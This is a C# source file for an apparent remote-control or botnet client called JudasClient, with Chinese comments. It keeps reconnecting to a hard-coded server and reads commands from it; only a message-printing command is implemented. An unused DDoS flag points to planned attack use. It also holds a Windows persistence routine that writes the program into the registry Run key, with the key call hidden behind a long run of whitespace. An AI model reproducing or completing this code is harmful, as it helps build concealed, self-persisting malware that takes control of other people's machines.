using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
namespace JudasClient;

#if WINDOWS
using Microsoft.Win32;
#endif

public class Client
{
    static string address = "::1";
    static int port = 5000;
    static int buffsize = 512;

    static bool ddos_flag = false;

    public static void Start(string[] args)
    {
        // 设置开机自启（仅在Windows操作系统下）
#if WINDOWS
            //SetAutoRun();
#endif

        // 启动服务
        Connect();
    }

    // 执行指令
    static void Execute(Socket socket)
    {
        Console.WriteLine("连接成功");

        while (true)
        {
            try
            {
                byte[] buffer = new byte[buffsize];
                int bytesRead = socket.Receive(buffer);
                string receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);

                if (receivedData.StartsWith("/msg="))
                {
                    Console.WriteLine(receivedData.Substring(5));
                }
            }
            catch
            {
                Console.WriteLine("出问题了断开客户端");
                socket.Close();
                Connect();
                return;
            }
        }
    }

    // 建立连接
    static void Connect()
    {
        while (true)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
                socket.DualMode = true;
                socket.Connect(address, port);
                Execute(socket);
                return;
            }
            catch
            {
                Console.WriteLine("连接失败 将在一秒后重连");
                Thread.Sleep(1000);
            }
        }
    }

    // 设置开机自启（仅在Windows操作系统下）
#if WINDOWS
        static void SetAutoRun()
        {
            using (RegistryKey key =
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                string name = System.IO.Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
                string path = System.Reflection.Assembly.GetEntryAssembly().Location;

                if (key.GetValue(name) == null)
                {
                    key.SetValue(name, path);
                }
            }
        }
#endif
}
